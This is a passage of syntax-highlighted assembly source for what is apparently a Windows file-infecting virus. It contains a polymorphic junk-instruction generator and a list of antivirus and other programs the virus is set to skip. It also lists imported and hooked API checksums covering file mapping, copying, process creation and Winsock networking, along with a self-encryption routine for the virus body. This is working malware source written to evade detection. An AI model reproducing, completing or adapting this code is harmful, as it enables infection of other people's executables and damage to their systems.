        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       generates a random mov reg,value or reg,reg2</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randommov</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">movreg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommovvalue</span><span class="sc0">

</span><span class="sc5">movback</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">movreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommovreg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">movback</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a random mov reg,value</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randommovvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       generates a random mov reg,reg2</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randommovreg</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;8b (c0+reg) or reg2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       generates a random cmp reg,reg2 or cmp reg,value</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">gencmp</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;39/3b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">gencmp</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gencmpvalue</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gencmp1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">gencmp1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">gencmpvalue</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;81f8</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">081f8h</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
        

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generate junk   f8 - fd</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genjunk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">                         </span><span class="sc1">;NO cli (WinNT hates it)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">





</span><span class="sc5">getrndal</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;value between 0-7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;i stole this routine from prizzy's crypto...</span><span class="sc0">

</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;Stolen from prizzy's Crypto</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGetTickCount</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">                </span><span class="sc1">;RDTCS instruction - read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;PCs ticks to EDX:EAX</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd32_seed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     CRC32's of programs not to infect</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">fnamecrc</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">_AVPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">                    </span><span class="sc1">;AVP</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">AVPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">        
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">_AVP32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">AVP32.EXE</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">FP</span><span class="sc4">-</span><span class="sc5">WIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">                   </span><span class="sc1">;f-prot</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">SCAN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">NOD32.EXE</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">;        crc32m  &lt;\&gt;</span><span class="sc0">
 </span><span class="sc1">;       crc32m  &lt;\&gt;</span><span class="sc0">
  </span><span class="sc1">;      crc32m  &lt;\&gt;</span><span class="sc0">
   </span><span class="sc1">;     crc32m  &lt;\&gt;</span><span class="sc0">
    </span><span class="sc1">;    crc32m  &lt;\&gt;</span><span class="sc0">

        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">HL.EXE</span><span class="sc4">&gt;</span><span class="sc0">                       </span><span class="sc1">;halflife</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">UNREALTOURNAMENT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">\</span><span class="sc5">YAPS.EXE</span><span class="sc4">&gt;</span><span class="sc0">                     </span><span class="sc1">;YetAnotherPortScanner</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">                              </span><span class="sc1">;mark end</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Imported API CRC's ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">functions</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                                                                  
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryA</span><span class="sc4">&gt;</span><span class="sc0">   
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetProcAddress</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateSemaphoreA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">ReleaseSemaphore</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateThread</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CloseHandle</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GlobalAlloc</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetTickCount</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetModuleHandleA</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetEndOfFile</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileMappingA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">MapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetFileSize</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetFilePointer</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CopyFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">MoveFileA</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateProcessA</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">Beep</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">ws32icrc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">WSAStartup</span><span class="sc4">&gt;</span><span class="sc0">   
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">inet_addr</span><span class="sc4">&gt;</span><span class="sc0">    
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">gethostbyaddr</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">htons</span><span class="sc4">&gt;</span><span class="sc0">        
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">socket</span><span class="sc4">&gt;</span><span class="sc0">       
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">connect</span><span class="sc4">&gt;</span><span class="sc0">      
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">send</span><span class="sc4">&gt;</span><span class="sc0">         
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">recv</span><span class="sc4">&gt;</span><span class="sc0">         
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">closesocket</span><span class="sc4">&gt;</span><span class="sc0">  
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">WSACleanup</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">hookedapicrcs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateProcessA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CopyFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">MoveFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">endhookcrcs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">filenametemp</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"c:\w32asm\vir\calc.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">oldedi</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">importedapis</span><span class="sc0">

</span><span class="sc5">blurb</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'(c)'</span><span class="sc0">

</span><span class="sc5">vend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">setupcryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;       softice is your friend</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">screatekey</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;using our 'checksum'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dec1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc5">dec1</span><span class="sc4">)-</span><span class="sc2">8</span><span class="sc0">


</span><span class="sc5">sgenkey</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">           
                                        
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                     

        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc3">"Liî"</span><span class="sc0">
</span><span class="sc5">smainkey</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">sgenkey</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">sdecryptmainbody</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;ENCRYPT</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">14</span><span class="sc0">                              </span><span class="sc1">;encrypt body using checksum</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">shah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">shah</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">sdone</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">screatekey</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sdecryptmainbody</span><span class="sc0">

</span><span class="sc5">sdone</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cryptedcrypter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endcryptedcrypter</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">cryptedcrypter</span><span class="sc0">
